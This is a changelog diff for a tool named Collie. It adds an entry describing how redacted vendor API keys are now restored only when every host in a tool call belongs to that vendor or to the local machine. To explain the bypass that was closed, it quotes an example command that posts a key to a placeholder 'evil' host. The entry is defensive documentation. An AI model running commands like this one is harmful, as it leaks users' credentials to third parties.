@@ -188,6 +188,14 @@
   as debris, and a window such as "微信" could not be found by its name. The same applied to the
   now-playing title on the wallpaper and to process command lines with non-ASCII paths. These
   scripts now write UTF-8. Machines whose code page is already UTF-8 were not affected.
+- Keep a vendor's API key from being sent to another host. When a tool call uses a key Collie has
+  redacted, the key is put back only at the last moment, and a key inside a URL was already
+  refused. That check alone let a key through in a POST body (`curl -d key=… https://evil/`), in a
+  URL assembled in a shell variable, or next to a URL given as a separate argument. Keys whose vendor
+  is recognisable (Anthropic, GitHub, Slack, AWS, Stripe, Google, Groq, xAI) are now restored only
+  when every host the call names belongs to that vendor or to this machine; otherwise the call runs
+  with the placeholder and fails visibly. Keys shared by several providers (`sk-…`) and generic
+  `api_key=` values keep the previous rule, since their destination cannot be told from the key.
 - Label facts imported from Claude Code as coming from Claude Code, on Windows. `collie mem import`
   decided the source from a `/.claude/` in the file's path, which a Windows path never contains,
   so every Claude Code session was recorded as `src:codex`.
